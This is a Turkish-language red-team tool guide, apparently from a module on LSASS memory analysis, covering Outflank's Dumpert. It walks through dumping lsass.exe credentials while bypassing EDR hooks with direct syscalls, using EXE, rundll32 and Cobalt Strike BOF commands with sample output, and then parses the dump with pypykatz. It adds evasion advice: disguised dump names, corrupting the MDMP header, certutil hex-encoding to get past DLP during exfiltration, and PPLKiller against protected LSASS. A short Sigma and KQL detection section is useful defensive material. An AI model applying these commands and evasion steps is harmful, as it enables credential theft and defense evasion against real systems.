# Dumpert

> **Kategori:** [7. Bellek Analizi, LSASS Dökümü ve Kasa Hasadı](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Outflank tarafından geliştirilen; EDR çözümlerinin kullanıcı alanında (Userland) `ntdll.dll` üzerine yerleştirdiği API kancalarını (Hook) doğrudan sistem çağrıları (Direct Syscalls) ve API kancasızlaştırma (Unhooking) teknikleriyle baypas ederek `lsass.exe` bellek dökümünü alan öncü C/BOF güvenlik aracı.

---

## 1. Genel Bakış ve Amaç

Modern uç nokta koruma sistemleri (EDR / XDR), işletim sisteminde çalışan süreçleri izlemek ve kötü amaçlı API çağrılarını engellemek için **Userland API Hooking** tekniğini kullanır. Bir süreç başladığında EDR'a ait özel bir dinamik bağlantı kütüphanesi (DLL) sürece enjekte edilir. Bu DLL, `ntdll.dll` içerisindeki kritik API fonksiyonlarının (örneğin `NtOpenProcess`, `NtReadVirtualMemory`, `NtCreateFile`) başlangıç baytlarını (Prologue) üzerine yazarak bir `JMP <EDR_Hook_Adresi>` talimatı yerleştirir. Klasik döküm araçları çalıştığında bu kancaya takılır ve işlem EDR tarafından engellenir.

**`Dumpert`** (Outflank ekibinden Cneelis tarafından geliştirilen), bu kancalama mekanizmasını tamamen etkisiz hale getiren ilk ve en etkili araçlardan biridir. Araç:
1. **API Kancasızlaştırma (Unhooking):** Diskteki temiz `\KnownDlls\ntdll.dll` veya `C:\Windows\System32\ntdll.dll` dosyasını salt-okunur olarak belleğe haritalar ve `.text` bölümünü inceleyerek bozulmamış sistem çağrı numaralarını (System Service Number - SSN / Syscall ID) dinamik olarak çeker.
2. **Doğrudan Sistem Çağrısı (Direct Syscalls):** Win32 veya ntdll API'lerini çağırmak yerine, doğrudan satır içi assembly (`inline asm`) ile x64 mimarisine özgü `syscall` makine talimatını çalıştırır. Çağrı doğrudan Windows çekirdeğine (Kernel / Ring 0) iletildiğinden, EDR'ın kullanıcı alanındaki (Ring 3) kancaları hiçbir şekilde tetiklenmez.
3. **MiniDumpWriteDump Koruması:** Doğrudan sistem çağrıları ile elde edilen temiz tanıtıcı üzerinden `MiniDumpWriteDump` fonksiyonunu çalıştırarak minidump dosyasını oluşturur.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│                      KULLANICI ALANI (RING 3)                          │
│                                                                        │
│  [ Standart Araç ] ──> [ EDR Kancalı ntdll.dll ] ──> ❌ BLOKE EDİLDİ! │
│                           (0xE9 JMP EDR.dll)                           │
│                                                                        │
│  [ Dumpert ]                                                           │
│       │                                                                │
│       ├── (1) Temiz ntdll Kopyasını İncele (\KnownDlls\ntdll.dll)       │
│       ├── (2) Dinamik Syscall Numaralarını (SSN) Çek                   │
│       │     - NtOpenProcess (SSN: 0x26)                                │
│       │     - NtCreateFile (SSN: 0x55)                                 │
│       │                                                                │
│       └── (3) Doğrudan Inline Assembly Çağrısı:                        │
│               mov r10, rcx                                             │
│               mov eax, SSN                                             │
│               syscall  ──────────────────────────┐ (EDR Atlama)        │
└──────────────────────────────────────────────────┼─────────────────────┘
                                                   │
┌──────────────────────────────────────────────────▼─────────────────────┐
│                      ÇEKİRDEK ALANI (RING 0)                           │
│                                                                        │
│  [ Windows Kernel (ntoskrnl.exe) ]                                     │
│       └── Temiz Syscall İcrası ──> LSASS Tanıtıcısı Dumpert'a Verilir  │
│                                                                        │
└──────────────────────────────────────────────────┬─────────────────────┘
                                                   │
                                                   ▼
                     [ Çıktı: C:\Windows\Temp\dumpert.dmp ]
```

### Neden Önemli?

| Yetenek / Özellik | Açıklama | Operasyonel Değeri |
|---|---|---|
| **Userland Hook Baypası** | EDR DLL'lerinin koyduğu `jmp` kancalarını atlayarak doğrudan çekirdeğe ulaşır. | SentinelOne, CrowdStrike, Defender ATP gibi EDR'ların API engellemelerini aşar. |
| **Dinamik SSN Tespiti** | Sabit syscall numaralarına güvenmez; Windows sürümüne göre numarayı dinamik çözer. | Farklı Windows 10/11 ve Server derlemelerinde hatasız çalışır. |
| **BOF ve DLL Desteği** | Bağımsız EXE, Rundll32 uyumlu DLL ve Cobalt Strike BOF formatlarında mevcuttur. | Dosyasız ve süreç içi çalıştırma senaryolarına tam uyum sağlar. |
| **Açık Kaynak Öncüsü** | SysWhispers ve modern syscall araçlarının mimari temelini oluşturur. | Güvenlik araştırmalarında referans kabul edilen kararlı bir kütüphanedir. |

### Karşılaştırma Tablosu

| Kriter | Dumpert | nanodump | Mimikatz (sekurlsa) | SysWhispers3 |
|---|---|---|---|---|
| **Teknik Temeli** | Direct Syscalls + Unhooking | Handle Duplication + Snapshot | Doğrudan API + Hooking | Syscall Kod Üreteci |
| **MiniDump Bağımlılığı** | Evet (`MiniDumpWriteDump`) | Hayır (Özel Yazıcı) | Evet / Dahili Ayrıştırıcı | Bağımsız (Kod Kütüphanesi) |
| **İmza Bozma (Obfuscation)**| Yok (Saf MDMP) | Var (Otomatik) | Yok | Kullanıcıya Bağlı |
| **Sysmon 10 Görünürlüğü** | Görünür (GrantedAccess) | Gizlenir (Meşru Çoğaltma) | Çok Belirgin | Görünür |
| **Çalışma Biçimi** | EXE / DLL / BOF | EXE / DLL / BOF | EXE / DLL / Script | C / ASM Kütüphanesi |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

```cmd
Dumpert.exe [HEDEF_DÖKÜM_YOLU]
rundll32.exe Dumpert.dll,Dump [HEDEF_DÖKÜM_YOLU]
beacon> inline-execute /path/to/dumpert.o [HEDEF_DÖKÜM_YOLU]
```

### Parametre ve Kullanım Mantığı

| Argüman / Format | Açıklama | Varsayılan Değer |
|---|---|---|
| `[HEDEF_DÖKÜM_YOLU]` | Minidump dosyasının yazılacağı tam disk yolu (İsteğe bağlı). | `C:\Windows\Temp\dumpert.dmp` |
| `Dumpert.dll,Dump` | Rundll32 üzerinden LOLBin yöntemiyle dışa aktarılan `Dump` fonksiyonu. | `C:\Windows\Temp\dumpert.dmp` |
| `dumpert.o (BOF)` | Cobalt Strike / Sliver üzerinden yeni süreç açmadan bellek içi çalıştırma nesnesi. | Konsola döküm / disk yolu |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Standart Dumpert İkilisi ile Varsayılan Konuma Döküm Alma

Yerel yönetici oturumunda `Dumpert.exe` doğrudan çalıştırılır. Araç `\KnownDlls\ntdll.dll` üzerinden temiz syscall numaralarını alır, `lsass.exe` sürecine handle açar ve dökümü oluşturur.

```cmd
Dumpert.exe
```

**Konsol Çıktısı Analizi:**

```text
  ___                               _   
 / _ \ _   _ |_|_ __ ___  _ __   ___| |_ 
| | | | | | | __| '_ ` _ \| '_ \ / _ \ __|
| |_| | |_| | |_| | | | | | |_) |  __/ |_ 
 \___/ \__,_|\__|_| |_| |_| .__/ \___|\__|
                          |_|             
    by Outflank (@Cneelis)

[+] Checking OS version...
[+] Windows Build: 19044 (Windows 10 21H2 x64)
[+] Unhooking ntdll.dll using \KnownDlls\ntdll.dll...
[+] Resolved Syscall: NtOpenProcess -> 0x26
[+] Resolved Syscall: NtCreateFile   -> 0x55
[+] Opening LSASS process with direct syscall...
[+] Process opened successfully! Handle: 0x148
[+] Dumping LSASS memory using MiniDumpWriteDump...
[+] Memory dump saved to: C:\Windows\Temp\dumpert.dmp (Size: 52.4 MB)
[+] Process completed successfully!
```

---

### Senaryo 2: Özel Çıktı Yolu ile Farklı Dizine Döküm Alma

EDR'ların `C:\Windows\Temp\dumpert.dmp` statik yolunu izlemesini engellemek için farklı bir masum dosya adı ve dizin belirlenir.

```cmd
Dumpert.exe C:\Users\Public\system_perf.etl
```

---

### Senaryo 3: Rundll32 ile Dumpert.dll Çağırma (LOLBin Entegrasyonu)

Executable (`.exe`) dosyaların çalıştırılmasının engellendiği (AppLocker / Software Restriction) ortamlarda, derlenmiş DLL dosyası `rundll32.exe` üzerinden çağrılır.

```cmd
rundll32.exe C:\Tools\Dumpert.dll,Dump C:\Windows\Temp\cache_report.dat
```

---

### Senaryo 4: Cobalt Strike Beacon İçinde BOF Olarak Çalıştırma

Diske hiçbir ikili dosya yazmadan, doğrudan Beacon oturumunun bellek alanı üzerinden Dumpert BOF nesnesi koşturulur.

```text
beacon> inline-execute C:\Tools\dumpert.o C:\Windows\Temp\crash.dmp
```

**Beacon Çıktısı:**

```text
[*] Running Dumpert BOF...
[+] Dynamic syscalls resolved via memory unhooking
[+] LSASS handle acquired via direct kernel transition
[+] Dump completed: C:\Windows\Temp\crash.dmp
```

---

### Senaryo 5: Elde Edilen Dökümü Linux'ta pypykatz ile Çözümleme

Dumpert tarafından oluşturulan minidump dosyası saldırganın Linux makinesine indirilerek şifreler ayrıştırılır.

```bash
pypykatz minidump /tmp/dumpert.dmp
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `NtOpenProcess failed with STATUS_ACCESS_DENIED (0xC0000022)` | Süreçte `SeDebugPrivilege` ayrıcalığı eksik veya LSASS üzerinde `RunAsPPL` aktif. | Komut istemini "Yönetici Olarak Çalıştır" ile başlatın; PPL devredeyse `PPLKiller` veya `PPLMedic` kullanın. |
| `Failed to unhook ntdll.dll / Map section failed` | `\KnownDlls\` nesne dizinine erişim Windows güvenlik politikalarıyla sınırlandırılmış. | `C:\Windows\System32\ntdll.dll` dosyasını doğrudan `CreateFile` ile açan güncel Dumpert sürümlerine geçin. |
| `MiniDumpWriteDump blocked by EDR behavior monitor` | Syscall ile tanıtıcı alınsa dahi `dbghelp.dll!MiniDumpWriteDump` çağrısı EDR davranış analizi tarafından yakalandı. | `MiniDumpWriteDump` bağımlılığı olmayan `nanodump` gibi özel ayrıştırıcılı araçlara geçin. |
| `Direct Syscall terminated by Kernel Exploit Guard / EDR` | EDR çekirdek sensörleri (ETW-TI) çağrının ntdll dışından geldiğini tespit etti (RIP register spoofing eksikliği). | Indirect Syscalls (dolaylı sistem çağrıları) kullanan `SysWhispers3` veya `nanodump` tercih edin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
        GÜRÜLTÜ SEVİYESİ: ORTA (SYSCALL BAŞARILI, ANCAK MINIDUMP İZİ VAR)
──────────────────────────────────────────────────────────────────
[ EDR Kancaları ]   : %100 Baypas (Userland Hooking devre dışı kalır)
[ Sysmon ]          : Event ID 10 (Direct Syscall olsa da Kernel loglayabilir)
[ Disk İzleri ]     : Standart MDMP başlıklı .dmp dosyası (AV taraması riski)
[ ETW-TI / Kernel ] : ntdll dışından yapılan doğrudan syscall çağrısı anomalisi
```

### 5.1 Bırakılan İzler (Artifacts & Event Logs)

1. **Sysmon Event ID 10 (Process Access):**
   - Doğrudan sistem çağrısı kullanılsa bile Windows Kernel seviyesindeki `ObRegisterCallbacks` mekanizması `lsass.exe` sürecine handle açıldığını algılar.
   - `GrantedAccess: 0x1fffff` veya `0x1010` değeri kaydedilir.
2. **MiniDumpWriteDump API İmzası:**
   - Dumpert tanıtıcıyı syscall ile alsa da bellek dökümünü yazarken meşru `dbghelp.dll` kütüphanesini yükler ve bu kütüphane EDR'lar tarafından incelenir.
3. **Statik Dosya İmzası:**
   - Oluşturulan dosya geçerli bir minidump başlığı (`MDMP`) taşıdığından disk taramalarında tespit edilebilir.

### 5.2 Ağ ve EDR İmzaları

- **RIP Register Anomalisi:** İşlemci çekirdeğe `syscall` komutunu gönderirken dönüş adresi (`RIP`) `ntdll.dll` adres alanı içinde olmalıdır. Dumpert doğrudan kendi kodu içinden `syscall` çalıştırdığı için ETW-TI (Threat Intelligence) sensörleri bu adresi şüpheli işaretler.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araçtaki Karşılığı |
|---|---|---|
| **T1003.001** | OS Credential Dumping: LSASS Memory | Direct Syscalls ile LSASS bellek dökümünü alma. |
| **T1562.001** | Impair Defenses: Disable or Modify Tools | Userland EDR API kancalarını (Unhooking) baypas etme. |
| **T1106** | Native API | Doğrudan yerel NT sistem çağrılarını kullanma. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Önlem ve Operasyonel Tavsiye |
|---|---|
| **Sabit Dosya Adı (`dumpert.dmp`)** | Parametresiz çalıştırmayın; varsayılan yol yerine her operasyonda farklı ve meşru görünümlü bir dosya adı tanımlayın. |
| **Disk İkili Tespiti** | `Dumpert.exe` yerine doğrudan Cobalt Strike BOF (`dumpert.o`) formatını bellek içinde çalıştırın. |
| **MDMP Başlık Koruması** | Döküm alındıktan hemen sonra dosyanın ilk 4 baytını rastgele baytlarla bozun veya dosyayı şifreleyerek sıkıştırın. |

### 5.5 Savunma Karşılığı (Blue Team / KQL & Sigma)

**Sigma Kuralı — Dumpert Benzeri Doğrudan LSASS Dökümü Alma Tespiti:**

```yaml
title: LSASS Memory Dump via Dumpert or Direct Syscalls
status: experimental
description: Detects processes accessing LSASS with direct syscall patterns or writing minidump files with typical Dumpert signatures.
logsource:
  product: windows
  service: sysmon
detection:
  selection_access:
    EventID: 10
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess:
      - '0x1fffff'
      - '0x1010'
  filter_known:
    SourceImage|endswith:
      - '\svchost.exe'
      - '\csrss.exe'
  condition: selection_access and not filter_known
level: high
```

**Microsoft Sentinel (KQL) — Bilinmeyen Süreçler Tarafından LSASS Bellek Dökümü:**

```kql
DeviceProcessEvents
| where InitiatingProcessFileName !in ("svchost.exe", "csrss.exe", "WerFault.exe")
| where CommandLine has_any ("dumpert", "dumpert.dmp", "MiniDumpWriteDump")
| project TimeGenerated, DeviceName, InitiatingProcessFileName, CommandLine
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Standart Dumpert Çalıştırma (Varsayılan Yol)
```cmd
Dumpert.exe
```
- **Ne Yapar?** Temiz ntdll kopyasını çözümler, direct syscall ile LSASS'a bağlanır ve dökümü `C:\Windows\Temp\dumpert.dmp` olarak yazar.
- **Ne Zaman Kullanılır?** Hızlı analiz gereken laboratuvar veya zayıf EDR korumalı sistemlerde.
- **Parametreler:** Parametresiz çalışır.

### Komut 2: Özel Çıktı Dosya Yolu Belirleme (OPSEC)
```cmd
Dumpert.exe C:\Windows\Temp\crash_report.log
```
- **Ne Yapar?** Minidump dosyasını `.dmp` yerine `.log` uzantısıyla ve özel bir adla kaydeder.
- **Ne Zaman Kullanılır?** Dosya adı ve uzantı tabanlı antivirüs taramalarını atlatmak için.
- **Parametreler:** İlk parametre hedef dosya yoludur.

### Komut 3: Rundll32 ile DLL Olarak Çalıştırma
```cmd
rundll32.exe Dumpert.dll,Dump C:\Users\Public\data.bin
```
- **Ne Yapar?** AppLocker gibi EXE engelleme mekanizmalarını aşmak için DLL üzerinden döküm alır.
- **Ne Zaman Kullanılır?** Yalnızca imzalı veya beyaz listedeki ikililerin çalıştırılabildiği ortamlarda.
- **Parametreler:** `Dumpert.dll,Dump`: Dışa aktarılan fonksiyon çağrısı.

### Komut 4: Cobalt Strike BOF Olarak Bellekte Çalıştırma
```text
beacon> inline-execute C:\Tools\dumpert.o C:\Temp\trace.dmp
```
- **Ne Yapar?** Aracı yerel diske yazmadan doğrudan Beacon bellek alanında çalıştırır.
- **Ne Zaman Kullanılır?** Süreç oluşturma (Event 4688) logu bırakmamak için.
- **Parametreler:** BOF nesnesi ve hedef dosya yolu.

### Komut 5: Alınan Dökümü pypykatz ile Açma
```bash
pypykatz minidump /tmp/crash_report.log
```
- **Ne Yapar?** Linux analiz makinesinde döküm içindeki NTLM hash'lerini ve parolaları ayrıştırır.
- **Ne Zaman Kullanılır?** Döküm başarıyla exfiltrate edildikten sonra.
- **Parametreler:** Minidump dosya yolu.

### Komut 6: Döküm Dosyasını Anında Sıkıştırarak Gizleme
```cmd
Dumpert.exe C:\Temp\t.dmp && powershell -c "Compress-Archive C:\Temp\t.dmp C:\Temp\perf.zip; Remove-Item C:\Temp\t.dmp"
```
- **Ne Yapar?** Döküm alınır alınmaz dosyayı ZIP arşivi içine gizler ve ham `.dmp` dosyasını siler.
- **Ne Zaman Kullanılır?** Disk tarayıcılarının dökümü yakalamasını önlemek için.
- **Parametreler:** Standart PowerShell sıkıştırma zinciri.

### Komut 7: Farklı Bir Sürücüye Döküm Alma
```cmd
Dumpert.exe D:\Backup\sys.dat
```
- **Ne Yapar?** C: sürücüsü dışındaki ikincil bir disk veya harici birime döküm yazar.
- **Ne Zaman Kullanılır?** C: sürücüsündeki disk alanı kısıtlı veya I/O izlemesi sıkı olduğunda.
- **Parametreler:** Hedef disk yolu.

### Komut 8: Minidump Başlığını Manuel Olarak Bozma (Antivirüs Atlatma)
```cmd
Dumpert.exe C:\Temp\out.dmp && certutil -encodehex C:\Temp\out.dmp C:\Temp\out.hex
```
- **Ne Yapar?** Minidump dosyasını hex metnine çevirerek ikili başlığı maskeler.
- **Ne Zaman Kullanılır?** Ağdan dışarıya veri taşırken DLP ve IPS sensörlerini aşmak için.
- **Parametreler:** `certutil` hex dönüştürme aracı.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [Outflanknl / Dumpert](https://github.com/outflanknl/Dumpert)
- **Outflank Blog:** [Direct Syscalls & Bypassing EDRs with Dumpert](https://outflank.nl/blog/)
- **MITRE ATT&CK Referansı:** [T1003.001 - OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)
- **SysWhispers Projesi:** [Jackson_T / SysWhispers](https://github.com/jthuraisamy/SysWhispers)

---

> **Önceki:** [← nanodump](./nanodump.md) · **Sonraki:** [lsassy →](./lsassy.md)
